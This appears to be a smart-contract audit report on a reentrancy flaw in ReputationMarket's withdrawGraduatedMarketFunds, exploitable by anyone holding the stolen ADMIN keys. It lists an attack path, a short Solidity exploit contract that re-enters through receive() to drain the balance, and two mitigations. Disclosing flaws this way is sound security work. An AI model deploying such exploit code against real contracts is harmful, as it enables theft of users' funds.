# Reentrancy in withdrawGraduatedMarketFunds - authorizedAddress/ADMIN only

### Summary

In `withdrawGraduatedMarketFunds` it's possible to trigger reentrancy at [`_sendEth`](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/ReputationMarket.sol#L675), if the ADMIN keys are stolen it could drain the contract

### Root Cause

In [`withdrawGraduatedMarketFunds`](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/ReputationMarket.sol#L660) it's possible to trigger reentrancy at [`_sendEth`](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/ReputationMarket.sol#L675), as there is no `ReentrancyGuard` in either the `withdrawGraduatedMarketFunds` or `_sendEth`, the `call` in [`_sendEth`](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/ReputationMarket.sol#L892) will lead to a reentrancy and since the [`marketFunds`](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/ReputationMarket.sol#L677) get set to 0 only after the `_sendEth` call, this allows the attacker with ADMIN keys to drain the entire contract

### Internal pre-conditions

1. Access to ADMIN keys

### External pre-conditions

_No response_

### Attack Path

1. Steal ADMIN keys 
2. graduateMarket
3. withdrawGraduatedMarketFunds
4. reentrancy loop in `_sendEth` to drain contract

### Impact

If the ADMIN keys are ever stolen it could drain the entire contract

pragma solidity 0.8.26;

import { ReputationMarket as Target } from "./ReputationMarket.sol";

contract Exploit {
    Target public target;
    uint256 profileId;

    constructor(address targetAddress, uint256 pId) {
        target = Target(targetAddress);
        profileId = pId;
    }

    function exploit() public {
        target.graduateMarket(profileId);
        target.withdrawGraduatedMarketFunds(profileId);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawGraduatedMarketFunds(profileId);
        }
    }
}
```

### Mitigation

Option 1: Add `ReeantrancyGuard` to `withdrawGraduatedMarketFunds`
Option 2: Set [`marketFunds`](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/ReputationMarket.sol#L677) to 0 before calling [`_sendETH` ](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/ReputationMarket.sol#L675)
